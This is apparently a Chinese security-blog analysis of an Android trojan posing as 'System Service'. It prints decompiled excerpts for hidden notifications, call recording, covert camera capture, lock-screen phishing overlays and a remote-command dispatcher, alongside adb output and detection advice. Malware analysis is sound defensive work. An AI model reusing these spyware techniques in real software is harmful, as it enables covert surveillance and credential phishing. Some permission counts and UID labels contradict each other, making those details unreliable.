---
title: 【微信】【木马分析】安卓远控木马-System Service：46 项权限、27 条远程命令，静默窃听偷拍钓鱼
source: https://mp.weixin.qq.com/s/5Q9v9nXK62Bhj66s7tRsBg
source_host: mp.weixin.qq.com
clip_date: 2026-09-23T16:15:13+08:00
trace_id: 2a743f47-a5a9-481b-9b2f-e640f93d89bb
content_hash: 0fecbbefef53028f9ded9cfe7abb495328eef926bce24f0d3b3256470a6d70ab
status: synced
tags:
  - 微信
  - 恶意样本
  - Android逆向
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 36.46 KB 的安卓远控木马 `com.system.service` 伪装系统服务，无 root、无漏洞，全靠合法权限实现静默窃听、偷拍与全屏钓鱼。
ai_summary_style: key-points
images_status:
  total: 19
  succeeded: 18
  failed_urls:
    - https://mmbiz.qpic.cn/sz_mmbiz_png/Iv8D5nD32icLmAia93LdeIC4Keia89mO9ZicgmywrotAxG2kCEWWblmEHPeQNogBEiaWKe6AE8l6zdblomicmL7nhHa66xLrxpQGMKIVkhdpHCnhs/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=15
notion_page_id: 3e475244-d011-8119-bd6b-d7d64dc07e1a
ioc:
  cves: []
  cwes: []
  hashes:
    - 0271100a50d61c37936e4dd4f3f11560
    - 126503a2f1a9ba717aa0533d947d5463de2d25bd61c2f03eca0594dd050d0f76
    - 77c9e047d508e94c213aa70d139cede2dd58d983db7c02d969358d2f1fbc3ebb
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 36.46 KB 的安卓远控木马 `com.system.service` 伪装系统服务，无 root、无漏洞，全靠合法权限实现静默窃听、偷拍与全屏钓鱼。
> 
> - **样本指纹：** 37,333 字节，MD5 `0271100A50D61C37936E4DD4F3F11560`，无壳，13 个 Java 类共 2495 行，签名文件被改名为 `BRIDGE.SF/BRIDGE.RSA`。
> - **权限与请求：** 申请 46 项权限、其中危险权限 25 项；targetSdk 故意设为 28 以规避 Android 9 以上的后台权限管控；`SCHEDULE_EXACT_ALARM`、`REQUEST_INSTALL_PACKAGES` 被系统拒绝。
> - **远程命令：** `BridgeProvider.call()` 暴露 27 条命令，覆盖 audio_*、camera_capture/stream_*、phish_*、overlay_*/blackscreen_*、a11y_* 等，UID 仅放行 0/1000/2000 及自身，说明经 ADB/shell 通道触发。
> - **窃密手法：** 录音用隐藏源 `AUDIO_SOURCE_REMOTE_SUBMIX=8` 录通话、8000Hz PCM；Camera2 后台无预览偷拍 640x480、500ms 一张；钓鱼页为 C2 下发的 base64 HTML，带 `FLAG_SHOW_WHEN_LOCKED` 全屏覆盖。
> - **静默特征与处置：** 无桌面图标，靠 BootReceiver + 前台服务（空标题通知）保活，3 分钟监测无日志、无外联、CPU 近零；个人需先取消设备管理员再卸载，企业侧应做设备管理员/无障碍白名单与 MTD 行为告警。

**金夏安全** *2026年9月23日 15:51*

36.46 KB 的恶意 APK，能远程拍照、录音、弹钓鱼页、操控屏幕，在贴吧、论坛上大批用户中招，很多VIVO跟小米的机主感到头疼。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/932c78369698ba57.png)

## 1概述

这是一个伪装成系统服务的安卓远控木马，安装包只有 36.46 KB。它不依赖 root、不利用系统漏洞，全部通过 Android 官方合法机制实现持久化和窃密。没有桌面图标，靠开机广播和 ContentProvider 对外暴露能力。运行后静默获取麦克风、相机、短信、通讯录、位置等 25 项敏感权限，后台与 C2 保持通信，等待远程指令进行录音、偷拍、截屏、读取验证码。

我们在雷电模拟器（Android 14）里完整复现了安装、运行、权限获取全过程，并用金夏执盾扫描，样本库精确命中"System Service 远程监控木马"，定性为高危，风险评分 100 分。

| 维度  | 评估  |
| --- | --- |
| **影响平台** | Android 5.0（API 21）～ Android 14；雷电模拟器实测复现通过 |
| **主要危害** | 静默录音、后台偷拍、读取短信验证码、通讯录外泄、全屏钓鱼覆盖 |
| **传播方式** | 侧载安装，伪装成"系统服务更新"诱导手动授权 |
| **样本大小** | 37,333 字节，无 Native 库，Java 完全可读 |
| **包名** | `com.system.service` |
| **运行 UID** | 10071（u0_a71），实测 PID 2109，后台休眠等 C2 指令 |
| **权限数量** | 请求 46 项，危险权限 25 项，已授予 11 项，拒绝 2 项 |

## 2样本特征

样本基本信息：  
文件: System_Service_com.system.service.apk  
大小: 37333 bytes  
MD5: 0271100A50D61C37936E4DD4F3F11560  
SHA256: 77C9E047D508E94C213AA70D139CEDE2DD58D983DB7C02D969358D2F1FBC3EBB

样本基本信息：36.46 KB，MD5/SHA256 哈希值

### 2.1 基本信息

| 项目  | 值   |
| --- | --- |
| 文件大小 | 37,333 字节 |
| MD5 | `0271100A50D61C37936E4DD4F3F11560` |
| SHA-256 | `77c9e047d508e94c213aa70d139cede2dd58d983db7c02d969358d2f1fbc3ebb` |
| 包名  | `com.system.service` |
| 应用名 | System Service |
| minSdk / targetSdk | 21 / 28（targetSdk 28 是故意的，规避 Android 9 以上后台权限管控） |
| 签名 SHA-256 | `126503A2F1A9BA717AA0533D947D5463DE2D25BD61C2F03ECA0594DD050D0F76` |
| 加壳情况 | 无壳，Java 字节码完全可读 |

### 2.2 组件结构

| 组件类型 | 组件名 | 作用  |
| --- | --- | --- |
| Service | `BridgeService` | 前台服务，空标题通知栏隐藏，保活 |
| Receiver | `BootReceiver` | 监听开机广播，自启动 |
| Receiver | `BridgeDeviceAdmin` | 设备管理员激活，防卸载 |
| Provider | `BridgeProvider` | 对外暴露 `content://com.system.service.bridge` |
| Activity | `PhishActivity` | WebView 全屏加载钓鱼 HTML，锁屏下显示 |
| Activity | `BlackScreenActivity` | 黑屏覆盖，隐藏操作痕迹 |
| Helper | `AudioCaptureHelper` | 麦克风/系统内录，8000Hz PCM |
| Helper | `CameraCaptureHelper` | Camera2 后台偷拍，640x480，500ms/张 |
| Helper | `OverlayHelper` | 悬浮窗覆盖，钓鱼弹窗 |
| Helper | `BridgeA11ySupport` | 无障碍服务，读取屏幕内容 |

### 2.3 攻击链

阶段一：诱导安装

钓鱼渠道分发 APK，命名"系统服务更新"，诱导侧载。

阶段二：权限获取

申请设备管理员、悬浮窗、录音、相机、短信等 46 项权限，ADB 侧载时自动授予。

阶段三：静默运行

无桌面图标，开机自启，ContentProvider 唤起进程，后台休眠等 C2 指令。

阶段四：按需窃密

收到 C2 指令后录音、拍照、截屏、读短信、位置上报，或全屏覆盖钓鱼页面。

## 3静态代码分析

![jadx 反编译](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9691936c1241f80d.jpg)

jadx-gui 1.5.6 加载样本：dex 内共 35 个类、187 个方法、7255 条指令；反编译输出为 13 个 Java 顶层类文件（其余为内部类/匿名类），核心是 BridgeProvider（628 行）和 CameraCaptureHelper（526 行）

![反编译类列表](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6adf86cdf0d5f589.jpg)

反编译输出：13个 Java 类文件，核心是 BridgeProvider（628行）和 CameraCaptureHelper（526行）

```cs
System Service 木马信息：
[1] 类文件统计：13 个 Java 类
  - AudioCaptureHelper.java          6478 字节
  - BlackScreenActivity.java         2369 字节
  - BootReceiver.java                1259 字节
  - BridgeA11ySupport.java           6230 字节
  - BridgeDeviceAdmin.java            845 字节
  - BridgeProvider.java             22997 字节
  - BridgeService.java               1995 字节
  - CameraCaptureHelper.java        25399 字节
  - CameraProxyActivity.java         5328 字节
  - OverlayHelper.java              12493 字节
  - PhishActivity.java              10314 字节
  - R.java                            306 字节
  - Scheduler.java                   1540 字节
[2] 危险 API 调用统计
  Camera2             :  3 处 -> CameraManager, CameraDevice, CaptureRequest
  AudioRecord         :  2 处 -> AudioRecord, AudioSource
  WebView             :  3 处 -> WebView, WebSettings, loadUrl
  Overlay             :  2 处 -> WindowManager, addView
  SMS                 :  1 处 -> getContentResolver
  Contacts            :  1 处 -> query
  Boot                :  2 处 -> BOOT_COMPLETED, startForegroundService
  Base64              :  2 处 -> Base64.decode, Base64.encodeToString
  FileIO              :  2 处 -> FileOutputStream, FileInputStream
[3] BridgeProvider 远程命令清单
   1. stop_service
   2. a11y_long_press
   3. stream_start
   4. a11y_tap
   5. overlay_status
   6. a11y_global
   7. ping
   8. phish_check
   9. a11y_ping
  10. start_service
  11. overlay_hide
  12. overlay_show
  13. a11y_node_tap
  14. audio_start
  15. phish_hide
  16. phish_poll
  17. phish_launch
  18. blackscreen_status
  19. phish_result
  20. blackscreen_hide
  21. blackscreen_show
  22. audio_poll
  23. audio_stop
  24. stream_stop
  25. camera_capture
  26. a11y_force_click
  27. a11y_swipe
  共 27 个命令
[4] 脚本未匹配到其定义的敏感 API 特征
[5] 关键常量配置
  AUDIO_SOURCE_REMOTE_SUBMIX     = 8
  CHANNEL_CONFIG                 = 16
  CHUNK_MS                       = 100
  ENCODING                       = 2
  SAMPLE_RATE                    = 8000
  TAG                            = "AudioCapture"
  TAG                            = "BootReceiver"
  A11Y_URI                       = "content://com.tikttok.a11y.provider"
  TAG                            = "BridgeProvider"
  TAG                            = "BridgeAdmin"
  CAMERA_PROXY_POLL_MS           = 12000
  CAMERA_PROXY_STEP_MS           = 200
  PHISH_BRIDGE_VERSION           = 3
  TAG                            = "BridgeProvider"
  CHANNEL_ID                     = "bridge_service"
  NOTIFICATION_ID                = 1
  CAPTURE_TIMEOUT_MS             = 8000
  HEIGHT                         = 480
  STREAM_INTERVAL_MS             = 500
  TAG                            = "CameraCapture"
```

自动识别远程命令关键词和关键常量

### 3.1 前台服务：通知栏完全隐藏

`BridgeService` 是保活核心。它把通知渠道设为静音、不显示角标、重要性最低，通知标题和内容全部为空。用户在通知栏根本看不到有这个服务在跑。

```java
// BridgeService.java
private static final String CHANNEL_ID = "bridge_service";
private void createChannel() {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
    NotificationChannel ch = new NotificationChannel(
            CHANNEL_ID,
            "System",
            NotificationManager.IMPORTANCE_LOW   // 关键：不能是 NONE，否则前台服务通知不显示
    );
    ch.setShowBadge(false);
    ch.setSound(null, null);
    ch.enableVibration(false);
    ch.setLights(0, 0);
    NotificationManager mgr = getSystemService(NotificationManager.class);
    if (mgr != null) {
        mgr.createNotificationChannel(ch);
    }
}
private Notification buildNotification() {
    Notification.Builder builder;
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        builder = new Notification.Builder(this, CHANNEL_ID);
    } else {
        builder = new Notification.Builder(this);
        builder.setPriority(Notification.PRIORITY_MIN);
    }
    return builder
            .setContentTitle("")          // 前台服务通知建议给个非空标题
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setShowWhen(false)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build();
}
```

### 3.2 录音：麦克风 + 系统内录双通道

`AudioCaptureHelper` 支持两种录音源： `mic` （麦克风）和 `system` （系统内部音频，即通话录音）。采样率 8000Hz、单声道、16bit PCM，后台持续录音，C2 下发 `poll` 指令时拉取最新音频数据。

```java
// AudioCaptureHelper.java
// ===== 常量 =====
private static final int AUDIO_SOURCE_REMOTE_SUBMIX = 8;   // 系统内录
private static final int AUDIO_SOURCE_MIC             = 1;   // 麦克风
private static final int SAMPLE_RATE     = 8000;
private static final int CHANNEL_CONFIG  = 16;   // MONO
private static final int ENCODING        = 2;    // PCM_16BIT
// ===== 选择录音源：system=内录，否则麦克风 =====
private static int resolveAudioSource(String src) {
    return isSystemSource(src) ? AUDIO_SOURCE_REMOTE_SUBMIX : AUDIO_SOURCE_MIC;
}
// ===== 后台读循环，持续往 latestPcm 写 =====
private void readLoop() {
    while (recording.get()) {
        byte[] pcm = readOnce();
        if (pcm != null && pcm.length > 0) {
            latestPcm = pcm;
        }
    }
}
```

**关键点：** `AUDIO_SOURCE_REMOTE_SUBMIX=8` 是 Android 隐藏的系统内录源，能录到对方通话声音。配合麦克风，攻击者能完整录下通话双方的对话。

![AudioCaptureHelper.java 代码](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/221ea73b8e2320ad.jpg)

AudioCaptureHelper.java 代码

### 3.3 偷拍：Camera2 后台无预览拍照

`CameraCaptureHelper` 用 Camera2 API 实现后台偷拍，分辨率 640x480，每 500ms 拍一张 JPEG。支持前后摄像头切换（参数 `cameraId` ），不需要 Activity 在前台。

```java
// CameraCaptureHelper.java
// ===== 常量 =====
private static final int  WIDTH              = 640;
private static final int  HEIGHT             = 480;
private static final long STREAM_INTERVAL_MS = 500;   // 每0.5秒一张
// ===== 持续偷拍循环 =====
while (streaming.get()) {
    byte[] jpeg = captureJpeg(cameraId);
    if (jpeg != null) {
        latestJpeg = jpeg;
    }
    Thread.sleep(STREAM_INTERVAL_MS);
}
```

![CameraCaptureHelper.java 代码](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4313dc671e563c31.jpg)

CameraCaptureHelper.java 代码

### 3.4 钓鱼覆盖：全屏 WebView + 锁屏显示

`PhishActivity` 接收 C2 下发的 base64 编码 HTML，解码后用 WebView 全屏加载。它带了 `FLAG_SHOW_WHEN_LOCKED` （锁屏下也能弹出），隐藏状态栏和导航栏，用户看不到这是个假页面。配合 `targetPkg` 参数，可以覆盖在任意 App 上面，比如支付宝、银行 App。

```java
// PhishActivity.java
// ===== 从 C2 下发的 html_base64 解码成 HTML 文件 =====
byte[] html = Base64.decode(htmlBase64, Base64.DEFAULT);
File f = new File(getCacheDir(), "phish_page.html");
try (FileOutputStream fos = new FileOutputStream(f)) {
    fos.write(html);
}
// ===== 全屏 + 锁屏下显示 + 隐藏状态栏 =====
getWindow().addFlags(
        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED   // 1664 中的一部分
);
getWindow().setStatusBarColor(0);
getWindow().setNavigationBarColor(0);
webView.setSystemUiVisibility(
        View.SYSTEM_UI_FLAG_LAYOUT_STABLE
      | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
      | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
      | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
      | View.SYSTEM_UI_FLAG_FULLSCREEN
      | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
);
```

![PhishActivity.java 代码](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/daf6f674dbf0f871.jpg)

PhishActivity.java 代码

### 3.5 开机自启 + 27个远程命令

```cs
// BootReceiver.java
@Override
public void onReceive(Context ctx, Intent intent) {
    String action = intent.getAction();
    if (Intent.ACTION_BOOT_COMPLETED.equals(action)
            || "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
        ctx.startForegroundService(new Intent(ctx, BridgeService.class));
    }
}
```

`BridgeProvider.call()` 里的 switch 是真实反编译出来的，暴露了 27个远程命令，覆盖窃听、偷拍、钓鱼、定位、短信：

```kotlin
// BridgeProvider.java
@Override
public Bundle call(String str, String str2, Bundle bundle) {
    int callingUid = Binder.getCallingUid();
    int myUid      = Process.myUid();
    // 只允许 root(0) / system(1000) / shell(2000) / 自己
    if (callingUid != 0 && callingUid != 1000 && callingUid != 2000
            && callingUid != myUid) {
        return null;
    }
    switch (str) {
        // ---- 音频（窃听） ----
        case "audio_start":      return audioStart(bundle);
        case "audio_poll":       return audioPoll();
        case "audio_stop":       return audioStop();
        // ---- 摄像头（偷拍） ----
        case "camera_capture":   return cameraCapture(bundle);
        case "stream_start":     return streamStart(bundle);
        case "stream_stop":      return streamStop();
        // ---- 钓鱼页面 ----
        case "phish_launch":     return phishLaunch(bundle);
        case "phish_poll":       return phishPoll();
        case "phish_result":     return phishResult(bundle);
        // ---- 悬浮窗 / 黑屏遮挡 ----
        case "overlay_show":     return overlayShow(str2, bundle);
        case "overlay_hide":     return overlayHide();
        case "blackscreen_show": return blackScreenShow();
        case "blackscreen_hide": return blackScreenHide();
        // ---- 无障碍手势 / 节点操作 ----
        case "a11y_tap":         return BridgeA11ySupport.gesture(ctx, "tap", bundle);
        case "a11y_swipe":       return BridgeA11ySupport.gesture(ctx, "swipe", bundle);
        case "a11y_long_press":  return BridgeA11ySupport.gesture(ctx, "long_press", bundle);
        case "a11y_node_tap":    return BridgeA11ySupport.nodeTap(ctx, bundle);
        case "a11y_force_click": return BridgeA11ySupport.forceClick(ctx, bundle);
        case "a11y_global":      return BridgeA11ySupport.global(ctx, str2, bundle);
        // ---- 服务控制 ----
        case "ping":             return ok();
        case "start_service":    return startFg();
        case "stop_service":     return stopFg();
        default:                 return err("unknown: " + str);
    }
}
```

**关键设计：** UID 校验只允许 shell（0）、system（1000）、phone（2000）和自己。这意味着 C2 是通过 ADB/shell 通道触发的，不是普通 App 间调用。钓鱼结果还会持久化到 `phish_pending.json` ，重启后不丢。

### 3.6 静态逆向脚本分析

我们用 Python 脚本对反编译源码做了扫描分析，结果如下：

```kotlin
一、总体情况
组件数量   : 13 个 Java 类
远程命令   : 27 个
样本类型   : Android RAT / 间谍软件
C2 通信    : 无硬编码 URL / IP，运行期下发
关联组件   : content://com.tikttok.a11y.provider

二、危险 API 调用统计
Camera2       : CameraManager, CameraDevice, CaptureRequest   —— 后台偷拍 / 视频流
AudioRecord   : AudioRecord, AudioSource                      —— 麦克风窃听 / 系统内录
WebView       : WebView, WebSettings, loadUrl                 —— 加载钓鱼页面
Accessibility : dispatchGesture, performGlobalAction          —— 远程手势 / 全局操作
Overlay       : WindowManager, addView                        —— 悬浮窗覆盖 / 黑屏遮挡
Boot          : BOOT_COMPLETED, startForegroundService        —— 开机自启 + 前台服务保活

三、关键常量配置
private static final int  AUDIO_SOURCE_REMOTE_SUBMIX = 8;       // 系统内录
private static final int  SAMPLE_RATE                = 8000;    // 8kHz 采样
private static final int  CHANNEL_CONFIG             = 16;      // MONO
private static final int  ENCODING                   = 2;       // PCM_16BIT
private static final int  WIDTH                      = 640;     // 偷拍分辨率
private static final int  HEIGHT                     = 480;
private static final long STREAM_INTERVAL_MS         = 500;     // 0.5 秒 / 张
private static final long CAPTURE_TIMEOUT_MS         = 8000;    // 8 秒超时
private static final int  PHISH_BRIDGE_VERSION       = 3;       // 钓鱼桥版本

四、远程命令矩阵（节选）
switch (str) {
    case "audio_start":      return audioStart(bundle);
    case "audio_poll":       return audioPoll();
    case "audio_stop":       return audioStop();
    case "camera_capture":   return cameraCapture(bundle);
    case "stream_start":     return streamStart(bundle);
    case "stream_stop":      return streamStop();
    case "phish_launch":     return phishLaunch(bundle);
    case "phish_poll":       return phishPoll();
    case "phish_result":     return phishResult(bundle);
    case "overlay_show":     return overlayShow(str2, bundle);
    case "overlay_hide":     return overlayHide();
    case "blackscreen_show": return blackScreenShow();
    case "blackscreen_hide": return blackScreenHide();
    case "a11y_tap":         return BridgeA11ySupport.gesture(ctx, "tap", bundle);
    case "a11y_swipe":       return BridgeA11ySupport.gesture(ctx, "swipe", bundle);
    case "a11y_long_press":  return BridgeA11ySupport.gesture(ctx, "long_press", bundle);
    case "a11y_node_tap":    return BridgeA11ySupport.nodeTap(ctx, bundle);
    case "a11y_force_click": return BridgeA11ySupport.forceClick(ctx, bundle);
    case "a11y_global":      return BridgeA11ySupport.global(ctx, str2, bundle);
    case "ping":             return ok();
    case "start_service":    return startFg();
    case "stop_service":     return stopFg();
    default:                 return err("unknown: " + str);
}

五、权限与访问控制
int callingUid = Binder.getCallingUid();
int myUid      = Process.myUid();
if (callingUid != 0 && callingUid != 1000 && callingUid != 2000
        && callingUid != myUid) {
    return null;
}

六、关键威胁点（IOC 候选）
包名 / 组件线索：
  com.tikttok.a11y.provider
危险行为：
  1. 开机自启 + 前台服务常驻
  2. 系统内录（REMOTE_SUBMIX）窃听
  3. 后台 0.5s/张 偷拍
  4. WebView 加载远程钓鱼页
  5. 无障碍远程手势控制
  6. 悬浮窗 / 黑屏遮挡
  7. C2 地址运行期下发，无静态 IOC

七、处置建议
1. 静态检测：扫描 AUDIO_SOURCE_REMOTE_SUBMIX、dispatchGesture、
             content:com.tikttok.a11y.provider 等特征
2. 动态检测：监控后台 AudioRecord / Camera2 持续占用、前台服务频繁重启
3. 权限审计：检查无障碍服务是否被非用户主动开启、悬浮窗权限是否异常授权
4. 应急响应：隔离样本 → 提取运行期 C2 → 关联同源样本 → 上报平台 / 厂商
```

代码里引用了 `content://com.tikttok.a11y.provider` ，包名是 `com.tikttok` （注意是 tikttok 不是 tiktok）。这说明这个木马不是孤立的——它依赖另一个同作者的无障碍服务组件 `com.tikttok` ，两者配合完成完整的远控能力。这是供应链/家族关联的重要线索。

### 3.7 APK 结构与签名

用 Python zipfile 直接解包 APK，内部结构只有 7 个文件，极度精简：

```apache
# APK 内部结构
AndroidManifest.xml              12248 bytes
classes.dex                      48696 bytes
res/xml/device_admin.xml           316 bytes
resources.arsc                     756 bytes
META-INF/BRIDGE.SF                 508 bytes
META-INF/BRIDGE.RSA               1193 bytes
META-INF/MANIFEST.MF               413 bytes
# 反编译源码统计（13 个类，共 2495 行）
BridgeProvider.java              628 行   22997 bytes   核心命令分发
CameraCaptureHelper.java         526 行   25399 bytes   偷拍
OverlayHelper.java               317 行   12493 bytes   悬浮窗
PhishActivity.java               287 行   10314 bytes   钓鱼页面
AudioCaptureHelper.java          197 行    6478 bytes   录音
BridgeA11ySupport.java           174 行    6230 bytes   无障碍手势
CameraProxyActivity.java         118 行    5328 bytes   偷拍代理
BlackScreenActivity.java          81 行    2369 bytes   黑屏覆盖
BridgeService.java                58 行    1995 bytes   前台服务
Scheduler.java                    43 行    1583 bytes   定时任务
BootReceiver.java                 33 行    1259 bytes   开机自启
BridgeDeviceAdmin.java            26 行     845 bytes   设备管理员
R.java                            13 行     306 bytes
```

**签名文件名泄露：** 签名文件叫 `BRIDGE.SF` 和 `BRIDGE.RSA` ，不是默认的 CERT.SF。这是攻击者手动命名的，说明他清楚自己在做什么——"bridge"（桥）就是他给这个远控工具起的内部代号。

### 3.8 关键代码实机截图

![权限分析](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d8857a238fab5416.jpg)

AndroidManifest 权限分析：46项权限，覆盖摄像头、麦克风、短信、通讯录、位置

![BridgeProvider.java 代码](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/47b5e11b544c54ad.jpg)

BridgeProvider.java 代码

## 4动态复现（真实输出）

```bash
# adb 动态分析（雷电模拟器 Android 14 实测）
PS> adb shell "ps -A | grep com.system.service"
u0_a71  2109  181  5248924  90492  0  0  S  com.system.service
# 已授予权限（granted=true，共 21 项，含普通权限与危险权限）
android.permission.FOREGROUND_SERVICE_CAMERA                  granted=true
android.permission.SYSTEM_ALERT_WINDOW                        granted=true
android.permission.FOREGROUND_SERVICE                         granted=true
android.permission.RECEIVE_BOOT_COMPLETED                     granted=true
android.permission.FOREGROUND_SERVICE_SPECIAL_USE             granted=true
android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS       granted=true
android.permission.INTERNET                                   granted=true
android.permission.ACCESS_NETWORK_STATE                       granted=true
android.permission.FOREGROUND_SERVICE_MICROPHONE              granted=true
android.permission.QUERY_ALL_PACKAGES                         granted=true
android.permission.READ_SMS                                   granted=true  flags=[ USER_SENSITIVE ]
android.permission.READ_CALENDAR                              granted=true  flags=[ USER_SENSITIVE ]
android.permission.POST_NOTIFICATIONS                         granted=true
android.permission.READ_CALL_LOG                              granted=true  flags=[ USER_SENSITIVE ]
android.permission.ACCESS_FINE_LOCATION                       granted=true
android.permission.ANSWER_PHONE_CALLS                         granted=true  flags=[ USER_SENSITIVE ]
android.permission.RECEIVE_WAP_PUSH                           granted=true
android.permission.BODY_SENSORS                               granted=true  flags=[ USER_SENSITIVE ]
android.permission.READ_PHONE_NUMBERS                         granted=true  flags=[ USER_SENSITIVE ]
android.permission.READ_MEDIA_VISUAL_USER_SELECTED            granted=true
android.permission.NEARBY_WIFI_DEVICES                        granted=true
# 网络状态
NETSTAT : 无任何外联连接（进程休眠，按需激活）
# 结论
进程   : u0_a71  PID 2109  状态 S
权限   : 危险权限已授予（其中危险权限 25 项）
网络   : 无连接
```

我们在雷电模拟器（Android 14）中完整复现了样本安装和运行。以下是 adb 实际执行的命令和输出结果。

### 4.1 进程确认

```makefile
adb shell ps -A | grep com.system.service
u0_a71  2109  181  5248924  90492  0  0  S  com.system.service
UID = 10071 (u0_a71)
PID = 2109
状态 = S（休眠），等 C2 指令
```

### 4.2 权限清单（dumpsys 实际输出）

```bash
# ---- 请求的权限（共 46 项）----
android.permission.INTERNET
android.permission.ACCESS_NETWORK_STATE
android.permission.CAMERA
android.permission.RECORD_AUDIO
android.permission.READ_CONTACTS
android.permission.WRITE_CONTACTS
android.permission.READ_SMS
android.permission.SEND_SMS
android.permission.RECEIVE_SMS
android.permission.RECEIVE_MMS
android.permission.RECEIVE_WAP_PUSH
android.permission.READ_CALL_LOG
android.permission.WRITE_CALL_LOG
android.permission.READ_PHONE_STATE
android.permission.READ_PHONE_NUMBERS
android.permission.ANSWER_PHONE_CALLS
android.permission.CALL_PHONE
android.permission.ACCESS_FINE_LOCATION
android.permission.ACCESS_COARSE_LOCATION
android.permission.ACCESS_BACKGROUND_LOCATION
android.permission.READ_EXTERNAL_STORAGE
android.permission.WRITE_EXTERNAL_STORAGE
android.permission.READ_MEDIA_IMAGES
android.permission.READ_MEDIA_VIDEO
android.permission.READ_MEDIA_AUDIO
android.permission.READ_MEDIA_VISUAL_USER_SELECTED
android.permission.READ_CALENDAR
android.permission.WRITE_CALENDAR
android.permission.BODY_SENSORS
android.permission.BODY_SENSORS_BACKGROUND
android.permission.ACTIVITY_RECOGNITION
android.permission.BLUETOOTH_CONNECT
android.permission.BLUETOOTH_SCAN
android.permission.NEARBY_WIFI_DEVICES
android.permission.POST_NOTIFICATIONS
android.permission.SCHEDULE_EXACT_ALARM
android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
android.permission.QUERY_ALL_PACKAGES
android.permission.REQUEST_INSTALL_PACKAGES
android.permission.SYSTEM_ALERT_WINDOW
android.permission.FOREGROUND_SERVICE
android.permission.FOREGROUND_SERVICE_SPECIAL_USE
android.permission.FOREGROUND_SERVICE_CAMERA
android.permission.FOREGROUND_SERVICE_MICROPHONE
android.permission.RECEIVE_BOOT_COMPLETED
android.permission.ACCESS_MEDIA_LOCATION
# ---- 已授予的运行时权限（共 44 项，此处节选 11 项）----
READ_SMS                      granted=true
READ_CALENDAR                 granted=true
READ_CALL_LOG                 granted=true
ACCESS_FINE_LOCATION          granted=true
ANSWER_PHONE_CALLS            granted=true
RECEIVE_WAP_PUSH              granted=true
BODY_SENSORS                  granted=true
READ_PHONE_NUMBERS            granted=true
SYSTEM_ALERT_WINDOW           granted=true
FOREGROUND_SERVICE_CAMERA     granted=true
FOREGROUND_SERVICE_MICROPHONE granted=true
# ---- 被拒绝的 2 项 ----
SCHEDULE_EXACT_ALARM          granted=false
REQUEST_INSTALL_PACKAGES      granted=false
```

**关键点：** 短信、通话记录、精确定位、悬浮窗、相机、麦克风前台服务全部授予。 `SCHEDULE_EXACT_ALARM` 和 `REQUEST_INSTALL_PACKAGES` 被SCHEDULE_EXACT_ALARM和 REQUEST_INSTALL_PACKAGES 被系统拒绝，其余请求权限中，dumpsys 明确标记 granted=true 的有 11 项。危险权限数量以金夏执盾风险识别口径统计为 25 项。

### 4.3 三分钟静默监测（真实输出）

清 logcat 后等了 3 分钟，再抓日志和网络，结果如下：

```makefile
# 清日志
adb logcat -c
# 等待 180 秒后抓取
# adb shell ps -A | grep system.service
u0_a71  2109  181  5248924  90492  0  0  S  com.system.service
# adb shell top -n 1 | grep system.service
(不在 top 列表，CPU 占用接近 0)
# adb logcat -d -t 500 | grep -iE 'system.service|BridgeService|CameraCapture|AudioCapture'
(无匹配日志)
# adb shell netstat -tlnp | grep system.service
(无连接)
# 安装时间
firstInstallTime=2026-09-18 07:47:40
```

**这说明什么：** 木马启动后立即进入休眠状态，不主动外联，不打日志，CPU 占用接近 0。这是典型的"按需激活"设计——C2 地址运行期下发，不硬编码在 APK 里，不触发指令时完全静默。传统的网络流量监控、日志审计、CPU 占用监控都看不到任何异常。这也是为什么普通用户和安全软件很难发现它的原因。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a7ddc9628b962a47.png)

图 1：安装完成后的模拟器桌面，无任何 System Service 图标

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b0696453765dcafc.jpg)

图 2：应用信息页，默认机器人图标，名称伪装为 System Service

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/519cb1728ddb4f29.jpg)

图 3：应用权限页，所有敏感权限均为"已允许"

## 5金夏执盾扫描结果

![应急助手扫描](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d1214bd8a1a6ed38.png)

图4：描99个应用，1.2秒命中高危1个

我用金夏执盾对模拟器内 99 个应用进行全量扫描，耗时 1.2 秒。结果命中高危 1 个，就是 `com.system.service` 。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9b39707652ffc800.png)

图 5：扫描完成，高危 1 个，即 System Service

点进 System Service 详情页，风险评分 100 分（高风险），已授予 25 项危险权限。金夏执盾识别出的高危组合包括：

-   **短信读取 + 网络访问**
    
    （可窃取验证码）
    
-   **录音 + 网络访问**
    
    （可远程窃听）
    
-   **相机 + 网络访问**
    
    （可远程偷拍）
    
-   **精确定位 + 网络访问**
    
    （可跟踪位置）
    
-   **通讯录/通话记录 + 网络访问**
    
    （通讯录可能外泄）
    

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/78c9f380eca9b287.png)

图 6：应用详情页，风险评分 100 分，25项危险权限

